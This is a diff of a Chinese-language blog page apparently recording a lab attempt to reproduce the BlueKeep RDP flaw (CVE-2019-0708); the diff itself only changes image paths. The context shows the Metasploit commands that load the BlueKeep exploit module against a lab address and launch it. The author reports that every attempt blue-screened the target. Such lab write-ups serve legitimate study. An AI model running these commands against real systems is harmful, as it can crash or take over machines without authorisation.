@@ -197,9 +197,9 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">set RHOST 10.10.10.128</span><br><span class="line">set target 3 				#根据实际情况进行选择</span><br><span class="line">exploit						#开始攻击</span><br></pre></td></tr></table></figure>
 <p>因为该攻击模块并不稳定,所以很容易导致靶机蓝屏,下面就是攻击失败的情况</p>
 <p>攻击开始后查看靶机的任务管理器,可以很明显的看到物理内存的使用率不断增加</p>
-<p><img src="/article/C:/Users\Joner\AppData\Roaming\Typora\typora-user-images\1568013185914.png" alt="1568013185914"></p>
+<p><img src="/article/56b64430/Users\Joner\AppData\Roaming\Typora\typora-user-images\1568013185914.png" alt="1568013185914"></p>
 <p>然后一会就蓝屏了</p>
-<p><img src="/article/CVE-2019-0708远程桌面代码执行漏洞复现/1568011278013.png" alt="1568011275740"></p>
+<p><img src="/article/56b64430/1568011278013.png" alt="1568011275740"></p>
 <p>最后试了好多次,依旧是蓝屏，蓝屏漏洞，果然名不虚传，看到一些视频也是会蓝屏很多次，最后下载了个一个原版的Win7 SP1 系统，根据github上大佬的提示，修改了内核数量，最终还是一直蓝屏。</p>
 <p>还是等到exp完善后再重新复现吧。</p>
 <p>参考</p>
